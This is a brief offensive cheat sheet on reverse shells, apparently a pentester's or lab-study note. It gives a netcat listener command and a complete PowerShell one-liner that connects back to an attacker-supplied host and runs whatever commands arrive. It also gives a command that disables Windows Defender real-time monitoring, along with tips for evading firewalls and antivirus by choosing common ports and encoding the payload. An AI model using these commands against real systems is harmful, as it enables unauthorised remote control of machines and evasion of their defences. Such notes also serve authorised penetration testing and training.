# Reverse Shells

Attack box listens, target connects out. Default choice — outbound traffic is rarely blocked.

Listen on attack box — use 443 or 80 to blend into expected egress traffic:

```bash
sudo nc -lvnp 443
```

PowerShell one-liner reverse shell — run on Windows target (update LHOST/LPORT):

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Defender blocks it → disable real-time protection (requires admin PS):

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

> [!warning] Defender blocks the PS one-liner by signature. If you can't disable AV, encode the payload or use a different delivery method — raw PowerShell reverse shells are fully signatured.

Use 443/80/8443 for the listener port. Deep packet inspection can still catch it regardless of port — port choice only bypasses basic firewall rules.